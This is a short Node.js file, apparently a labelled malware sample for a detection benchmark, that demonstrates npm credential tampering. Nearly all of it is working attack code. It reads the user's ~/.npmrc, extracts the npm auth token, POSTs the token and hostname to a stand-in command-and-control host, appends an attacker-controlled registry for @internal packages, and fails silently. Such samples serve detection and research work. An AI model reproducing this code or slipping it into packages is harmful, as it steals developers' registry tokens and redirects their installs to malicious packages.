// Credential tampering: reads and modifies .npmrc to inject attacker's registry
// Technique: credential_tampering — modifying auth tokens and registry config
// Real-world: 202 samples in Datadog benchmark

const fs = require('fs');
const path = require('path');
const os = require('os');
const http = require('http');

const npmrcPath = path.join(os.homedir(), '.npmrc');

try {
  // Step 1: Steal existing tokens
  const content = fs.readFileSync(npmrcPath, 'utf8');
  const tokenMatch = content.match(/\/\/registry\.npmjs\.org\/:_authToken=(.+)/);

  if (tokenMatch) {
    // Exfiltrate the token
    const req = http.request({
      hostname: 'tamper-c2.example.com',
      path: '/steal',
      method: 'POST'
    }, () => {});
    req.end(JSON.stringify({ token: tokenMatch[1], host: os.hostname() }));
  }

  // Step 2: Add attacker-controlled registry for scoped packages
  const injection = '\n@internal:registry=https://evil-registry.example.com/\n//evil-registry.example.com/:_authToken=attacker-token\n';
  fs.appendFileSync(npmrcPath, injection);
} catch(e) {
  // Silently fail
}
